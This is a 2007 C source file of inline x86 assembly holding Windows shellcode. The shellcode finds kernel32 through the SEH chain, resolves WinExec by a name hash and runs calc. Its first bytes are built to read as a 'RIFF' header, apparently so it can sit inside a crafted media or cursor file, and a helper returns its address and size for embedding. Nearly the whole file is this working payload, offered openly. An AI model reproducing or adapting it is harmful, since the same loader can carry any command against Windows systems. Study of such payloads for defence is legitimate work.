/*
 * Auteur : Lionel d'Hauenens
 * bugs : http://www.labo-asso.com
 * le 31/03/2007
 */

typedef struct _SHELLCODE_INFO
{
    PVOID start;
    ULONG size;                              
}SHELLCODE_INFO, *PSHELLCODE_INFO;

VOID get_shellcode_info (PSHELLCODE_INFO shellcode_info)
{
    // CRC  "WinExec" => 0xE8BF9231  

    PVOID p_shellcode = 0;
    ULONG sizeof_shellcode = 0;
    
    /* "RIFF" -> push edx
                 dec ecx
                 inc esi
                 inc esi */    
 
    asm ("pushal");            
    asm (".intel_syntax noprefix");
        asm ("call end                     ;\
    start :                                ;\
              dec esi                      ;\
              dec esi                      ;\
              inc ecx                      ;\
              pop edx                      ;\
                                           ;\
              pushad                       ;\
              call Get_kernel32_handle     ;\
              or eax,eax                   ;\
              je Exit                      ;\
                                           ;\
              mov ebx, eax                 ;\
              mov ebp, 0xE8BF9231          ;\
              call Get_proc_address        ;\
              or eax,eax                   ;\
              je Exit                      ;\
                                           ;\
              xor edx,edx                  ;\
              push edx                     ;\
              call Push_calc_pointer       ;\
              .byte 'c','a','l','c',0      ;\
        Push_calc_pointer:                 ;\
              call eax                     ;\
        Exit :                             ;\
              popad                        ;\
              xor eax,eax                  ;\
              ret 0x14                     ;\
                                           ;\
    Get_kernel32_handle:                   ;\
              xor eax,eax                  ;\
              mov eax,fs:[eax]             ;\
        Loop_scan_seh:                     ;\
              mov edx, [eax]               ;\
              inc edx                      ;\
              jz Find_kernel32_address     ;\
              mov eax, [eax]               ;\
              jmp Loop_scan_seh            ;\
        Find_kernel32_address:             ;\
              mov eax,[eax+04]             ;\
                                           ;\
              and eax, 0xFFFF0000          ;\
        Loop_scan_kernel32_IB:             ;\
              cmp word ptr [eax], 0x5A4D   ;\
              je Find_kernel32_IB          ;\
              sub eax, 0x00010000          ;\
              jmp Loop_scan_kernel32_IB    ;\
        Find_kernel32_IB:                  ;\
              mov edx, [eax+0x3C]          ;\
              cmp dword ptr [eax+edx], 0x4550  ;\
              je Kernel32_IB_ok            ;\
              xor eax,eax                  ;\
        Kernel32_IB_ok:                    ;\
              ret                          ;\
                                           ;\
    Get_proc_address:                      ;\
              pushad                       ;\
              mov edi, ebx                 ;\
              add     edi,[ebx+0x3C]             ;\
              lea     edi,[edi+0x18]             ;\
              lea     edi,[edi+0x60]             ;\
              or      edi,edi                    ;\
              je      error_get_proc_address     ;\
                                                 ;\
              mov     edi,[edi]                  ;\
              add     edi,ebx                    ;\
              mov     ecx,[edi+0x18]             ;\
              mov     edx,[edi+0x20]             ;\
              add     edx,ebx                    ;\
                                                 ;\
              cld                                ;\
        Loop_scan_api_name:                      ;\
              dec ecx                            ;\
              jl      error_get_proc_address     ;\
              mov     esi,[edx+ecx*4]            ;\
              add     esi,ebx                    ;\
                                                 ;\
              push edx                           ;\
              xor eax,eax                        ;\
              cdq                                ;\
          Loop_crc_api_name:                     ;\
              lodsb                              ;\
              or al,al                           ;\
              je End_of_string                   ;\
              rol edx, 7                         ;\
              add edx, eax                       ;\
              jmp  Loop_crc_api_name             ;\
         End_of_string:                          ;\
              cmp     ebp,edx                    ;\
              pop     edx                        ;\
              jnz     Loop_scan_api_name         ;\
                                                 ;\
        Find_api_name:                           ;\
              mov     edx,[edi+0x24]             ;\
              add     edx,ebx                    ;\
              movzx   eax,word ptr [edx+ecx*2]   ;\
              shl     eax,2                      ;\
              mov     edx,[edi+0x1C]             ;\
              add     edx,ebx                    ;\
              mov     eax,[eax+edx]              ;\
              add     eax,ebx                    ;\
                                                 ;\
        exit_get_proc_address:                   ;\
              mov     [esp+0x1C],eax             ;\
              popad                              ;\
              ret                                ;\
                                                 ;\
        error_get_proc_address:                  ;\
              xor eax,eax                        ;\
              jmp exit_get_proc_address          ;\
                                                 ;\
    end : pop eax; lea ebx, (end-start);"); 
    asm (".att_syntax noprefix");  
    asm ("":"=a"(p_shellcode), "=b"(sizeof_shellcode));
    asm ("popal");   
    
    shellcode_info->start = p_shellcode;    
    shellcode_info->size = sizeof_shellcode; 
} 
